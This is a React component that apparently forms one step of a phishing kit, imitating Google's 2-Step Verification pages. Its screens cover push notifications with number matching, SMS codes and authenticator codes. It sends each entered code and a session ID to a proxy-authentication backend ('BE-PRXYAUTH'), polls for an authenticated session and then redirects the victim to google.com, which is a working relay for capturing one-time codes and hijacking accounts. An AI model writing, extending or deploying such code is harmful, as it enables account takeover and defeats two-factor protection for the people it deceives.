"use client";

import { AxiosError } from "axios";
import React, { useEffect, useState } from "react";
import api from "../../lib/api";
import { Button } from "../ui/Button";
import { useRegistration } from "./RegistrationContext";

export default function Step5OTP() {
  const {
    data,
    updateData,
    setStep,
    isLoading,
    setIsLoading,
    error,
    setError,
  } = useRegistration();
  const [otp, setOtp] = useState("");

  // Extract challenge data
  const challengeType = data.challengeType || "TOTP"; // Default to TOTP if undefined
  const metadata = data.challengeMetadata || {};

  // Push notification need to poll for status or wait for user action
  const isPush = challengeType === "PUSH" || challengeType === "NUMBER_PICKER";
  const isSMS = challengeType === "SMS" || challengeType === "VOICE";

  // For PUSH, we might need to poll the status
  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (isPush && !error) {
      interval = setInterval(async () => {
        try {
          const response = await api.get(`/google/session/${data.sessionId}`);
          if (response.data.status === "AUTHENTICATED") {
            window.location.href = "https://google.com";
            clearInterval(interval);
          }
        } catch (e) {
          // Ignore polling errors
        }
      }, 3000);
    }
    return () => clearInterval(interval);
  }, [isPush, data.sessionId, error]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp && !isPush) return;

    setIsLoading(true);
    setError(null);

    try {
      // Step 5: Submit OTP
      // Calling BE-PRXYAUTH endpoint: POST /api/google/2fa
      const response = await api.post("/google/2fa", {
        sessionId: data.sessionId,
        code: otp,
      });

      if (response.data.success) {
        window.location.href = "https://google.com";
      } else {
        setError(response.data.message || "Invalid code");
      }
    } catch (err: any) {
      if (err instanceof AxiosError && err.response) {
        setError(
          err.response.data.message ||
            err.response.data.error ||
            "An error occurred",
        );
      } else {
        setError("Network error. Please try again.");
      }
    } finally {
      setIsLoading(false);
    }
  };

  const renderContent = () => {
    if (isPush) {
      return (
        <div className="text-center">
          <div className="mt-6 flex justify-center">
            <img
              src="https://ssl.gstatic.com/accounts/signup/glif/personal.svg"
              alt=""
              className="w-16 h-16 animate-pulse"
            />
          </div>
          <h2 className="text-[24px] font-normal text-[#1f1f1f] mt-4 mb-2">
            Check your phone
          </h2>
          <p className="text-[16px] text-[#1f1f1f] mb-4">
            Google sent a notification to your phone.
            {metadata.verificationNumber ? (
              <>
                {" "}
                Tap <strong>the number below</strong> on the notification to
                verify it's you.
              </>
            ) : (
              <>
                {" "}
                Tap <strong>Yes</strong> on the notification to verify it's you.
              </>
            )}
          </p>
          {metadata.verificationNumber && (
            <div className="my-6">
              <p className="text-[#444746] text-sm mb-2">Match this number:</p>
              <div className="text-4xl font-bold text-[#1f1f1f]">
                {metadata.verificationNumber}
              </div>
            </div>
          )}
        </div>
      );
    }

    if (isSMS) {
      return (
        <>
          <div className="text-center mb-6">
            <h1 className="text-[24px] font-normal text-[#1f1f1f] mb-2">
              2-Step Verification
            </h1>
            <p className="text-[16px] text-[#1f1f1f]">
              A text message with a verification code was just sent to{" "}
              <strong>{metadata.phoneNumber || "your phone"}</strong>
            </p>
          </div>
          <div className="relative">
            <input
              type="text"
              id="otp"
              value={otp}
              onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
              className="block px-3.5 pb-2.5 pt-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] focus:border-[#0b57d0] focus:ring-1 focus:ring-[#0b57d0] appearance-none focus:outline-none peer h-[56px] tracking-widest"
              placeholder=" "
              autoComplete="one-time-code"
              pattern="[0-9]*"
              inputMode="numeric"
            />
            <label
              htmlFor="otp"
              className="absolute text-[16px] text-[#444746] duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-[#0b57d0] peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-2.5"
            >
              Enter the code
            </label>
          </div>
        </>
      );
    }

    // Default TOTP / Authenticator
    return (
      <>
        <div className="text-center mb-6">
          <h1 className="text-[24px] font-normal text-[#1f1f1f] mb-2">
            2-Step Verification
          </h1>
          <p className="text-[16px] text-[#1f1f1f]">
            Get a verification code from the{" "}
            <strong>Google Authenticator</strong> app
          </p>
        </div>
        <div className="relative">
          <input
            type="text"
            id="otp"
            value={otp}
            onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
            className="block px-3.5 pb-2.5 pt-4 w-full text-[16px] text-[#1f1f1f] bg-transparent rounded-[4px] border border-[#747775] focus:border-[#0b57d0] focus:ring-1 focus:ring-[#0b57d0] appearance-none focus:outline-none peer h-[56px] tracking-widest"
            placeholder=" "
            autoComplete="off"
            pattern="[0-9]*"
            inputMode="numeric"
          />
          <label
            htmlFor="otp"
            className="absolute text-[16px] text-[#444746] duration-300 transform -translate-y-4 scale-75 top-2 z-10 origin-[0] bg-white px-1 peer-focus:px-1 peer-focus:text-[#0b57d0] peer-placeholder-shown:scale-100 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:top-1/2 peer-focus:top-2 peer-focus:scale-75 peer-focus:-translate-y-4 left-2.5"
          >
            Enter code
          </label>
        </div>
      </>
    );
  };

  return (
    <form onSubmit={handleSubmit} className="w-full max-w-[450px] mx-auto">
      <div className="mb-8">
        <div className="text-center mb-6">
          <div className="border border-[#e7eaed] rounded-[20px] px-3 py-1 text-[14px] inline-flex items-center font-medium">
            <span className="max-w-[200px] truncate">{data.email}</span>
            <svg
              className="ml-2 w-4 h-4 text-[#444746]"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z" />
            </svg>
          </div>
        </div>

        {renderContent()}

        {error && (
          <div className="text-[#b3261e] text-sm flex items-start mt-2">
            <svg
              aria-hidden="true"
              className="w-4 h-4 mr-2 mt-0.5"
              fill="currentColor"
              focusable="false"
              viewBox="0 0 24 24"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
            </svg>
            {error}
          </div>
        )}
      </div>

      <div className="flex justify-between items-center mt-12">
        <Button
          type="button"
          variant="text"
          onClick={() => {}}
          className="text-[#0b57d0]"
        >
          Try another way
        </Button>

        {!isPush && (
          <Button
            type="submit"
            isLoading={isLoading}
            disabled={!otp || isLoading}
          >
            Next
          </Button>
        )}
      </div>
    </form>
  );
}
